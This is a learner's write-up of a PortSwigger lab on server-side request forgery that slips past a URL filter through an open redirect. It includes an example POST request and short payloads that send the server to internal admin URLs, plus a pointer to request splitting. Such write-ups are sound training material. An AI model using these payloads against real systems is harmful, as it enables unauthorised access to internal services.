# SSRF with filter bypass via open redirection vulnerability

[Lab in PortSwigger](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

## Definition
It is sometimes possible to circumvent any kind of filter-based defenses by exploiting an open redirection vulnerability.

In the preceding SSRF example, suppose the user-submitted URL is strictly validated to prevent malicious exploitation of the SSRF behavior. However, the application whose URLs are allowed contains an open redirection vulnerability. Provided the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target.

For example, suppose the application contains an open redirection vulnerability in which the following URL: `/product/nextProduct?currentProductId=6&path=http://evil-user.net` returns a redirection to: `http://evil-user.net`

You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:
```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

This SSRF exploit works because the application first validates that the supplied stockAPI URL is on an allowed domain, which it is. The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the internal URL of the attacker's choosing. 

## Notes
Admin URL
`http://192.168.0.12:8080/admin`

Open redirect vulnerability
`GET /product/nextProduct?currentProductId=4&path=/product?productId=5`

SSRF payload using open redirect
`GET /product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin`

Another option: [SSRF request splitting](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)

## Key Words
> filter, bypass, open redirect, cr-lf injection, request splitting, ssrf